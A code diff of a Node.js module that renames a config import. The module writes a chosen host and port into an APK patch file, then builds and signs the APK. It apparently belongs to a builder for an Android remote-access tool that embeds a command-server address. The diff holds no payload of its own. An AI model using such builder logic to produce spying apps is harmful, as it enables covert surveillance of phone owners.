@@ -1,7 +1,7 @@
 const
     cp = require('child_process'),
     fs = require('fs'),
-    CONST = require('./config');
+    config = require('./config');
 
 // Java version check for uber-apk-signer compatibility (Java 8+ supported, Java 17+ recommended)
 function javaversion(callback) {
@@ -37,10 +37,10 @@ function javaversion(callback) {
 
 function patchAPK(URI, PORT, cb) {
     if (PORT < 25565) {
-        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
+        fs.readFile(config.patchFilePath, 'utf8', function (err, data) {
             if (err) return cb('File Patch Error - READ')
             var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
-            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
+            fs.writeFile(config.patchFilePath, result, 'utf8', function (err) {
                 if (err) return cb('File Patch Error - WRITE')
                 else return cb(false)
             });
@@ -50,13 +50,13 @@ function patchAPK(URI, PORT, cb) {
 
 function buildAPK(cb) {
     javaversion(function (err, version) {
-        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
+        if (!err) cp.exec(config.buildCommand, (error, stdout, stderr) => {
             if (error) return cb('Build Command Failed - ' + error.message);
-            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
+            else cp.exec(config.signCommand, (error, stdout, stderr) => {
                 if (!error) {
                     // Copy the signed APK to the download location
-                    const downloadApkPath = CONST.apkBuildPath.replace('build.apk', 'build.s.apk');
-                    fs.copyFile(CONST.apkBuildPath, downloadApkPath, (copyError) => {
+                    const downloadApkPath = config.apkBuildPath.replace('build.apk', 'build.s.apk');
+                    fs.copyFile(config.apkBuildPath, downloadApkPath, (copyError) => {
                         if (copyError) return cb('Failed to copy signed APK - ' + copyError.message);
                         return cb(false);
                     });
